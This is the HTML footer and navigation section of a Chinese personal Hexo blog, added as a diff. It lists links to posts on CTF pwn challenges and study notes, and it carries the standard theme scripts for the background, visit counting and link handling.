+            <a href="/2019/05/10/pwn易忘操作原理笔记/" title="上一篇: pwn易忘操作原理笔记">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2019/05/10/pwn学习之三/" title="下一篇: pwn学习之三">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/05/10/CTF-2019-quicksort、babyshell、upxofcpp/">*CTF 2019 quicksort、babyshell、upxofcpp</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/10/pwnable-tw-tcache-tear/">pwnable.tw tcache_tear</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/10/pyspark如何遍历broadcast/">pyspark如何遍历broadcast</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/10/pwn易忘操作原理笔记/">pwn易忘操作原理笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/10/pwn学习之四/">pwn学习之四</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/10/pwn学习之三/">pwn学习之三</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/10/pwn学习之二/">pwn学习之二</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/10/pwn学习之一/">pwn学习之一</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/10/2017GCTF部分writeup/">2017GCTF部分writeup</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2016-2019 loeklvlh
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style="display:none">
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style="display:none">
+                        <span id="page-visit" title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
